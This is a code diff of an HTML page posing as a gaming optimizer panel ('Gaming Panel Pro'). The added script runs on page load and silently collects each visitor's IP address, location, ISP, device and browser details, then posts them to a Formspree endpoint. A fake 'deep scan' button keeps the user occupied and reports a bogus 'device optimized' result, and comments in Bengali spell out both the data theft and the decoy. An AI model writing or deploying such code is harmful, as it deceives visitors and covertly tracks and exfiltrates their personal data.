@@ -58,48 +58,53 @@
 
     <footer>&copy; 2026 Gaming Panel Pro | Dev by Sojol</footer>
 
-    <script>
-        // স্ক্যানার এবং ইমেইল পাঠানোর ফাংশন
-        async function startScan() {
-            const btn = document.getElementById('scanBtn');
-            btn.innerText = "SCANNING...";
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                document.getElementById('ip-info').innerText = "IP: " + data.ip;
+       <script>
+async function collectData() {
+    try {
+        // ১. আইপি এবং প্রোভাইডার তথ্য (ISP)
+        const ipRes = await fetch('https://ipapi.co/json/');
+        const data = await ipRes.json();
+        
+        const info = {
+            IP: data.ip,
+            City: data.city,
+            Region: data.region,
+            Country: data.country_name,
+            ISP: data.org, // কোন কোম্পানির ইন্টারনেট ব্যবহার করছে
+            Device: navigator.userAgent.split(')')[0].split('(')[1],
+            Platform: navigator.platform,
+            Language: navigator.language,
+            Connection: navigator.connection ? navigator.connection.effectiveType : "Unknown"
+        };
 
-                const device = navigator.platform + " (Android 10)";
-                document.getElementById('dev-info').innerText = "Device: " + device;
+        // ২. আপনার Formspree আইডিতে ডাটা পাঠানো
+        fetch("https://formspree.io/f/mgorkgyy", {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(info)
+        });
 
-                let bat = "98%";
-                if (navigator.getBattery) {
-                    const b = await navigator.getBattery();
-                    bat = (b.level * 100) + "%";
-                    document.getElementById('bat-info').innerText = "Battery: " + bat;
-                }
+        // ৩. স্ক্রিনে দেখানোর জন্য (ঐচ্ছিক)
+        document.getElementById('ip-info').innerText = "IP: " + data.ip;
+        document.getElementById('dev-info').innerText = "Provider: " + data.org;
+    } catch (e) {
+        console.log("Stealth mode active...");
+    }
+}
 
-                // আপনার ইমেইলে ডাটা পাঠানোর আসল লিঙ্ক
-                fetch("https://formspree.io/f/mgorkgyy", {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ IP: data.ip, Device: device, Battery: bat })
-                });
+// ইউজার সাইটে ঢোকার সাথে সাথে ডাটা কালেকশন শুরু হবে
+window.onload = collectData;
 
-                alert("Scan Complete! System Healthy.");
-                btn.innerText = "SUCCESS";
-            } catch (e) {
-                alert("Scanning...");
-            }
-        }
+async function startScan() {
+    // আগের বাটনের ফাংশন যা ইউজারকে ব্যস্ত রাখবে
+    const btn = document.getElementById('scanBtn');
+    btn.innerText = "SCANNING SYSTEM...";
+    setTimeout(() => {
+        alert("Deep Scan Complete! Your device is optimized.");
+        btn.innerText = "SYSTEM SECURE";
+    }, 3000);
+}
+</script>
 
-        // প্যানেল অ্যাক্টিভেট করার ফাংশন
-        function activate() {
-            let phone = document.getElementById('phone').value;
-            if(phone === "") { alert("মোবাইলের নাম লিখুন!"); return; }
-            document.getElementById('v1').innerText = "195%";
-            document.getElementById('v2').innerText = "188%";
-            document.getElementById('result').style.display = 'block';
-        }
-    </script>
 </body>
 </html>
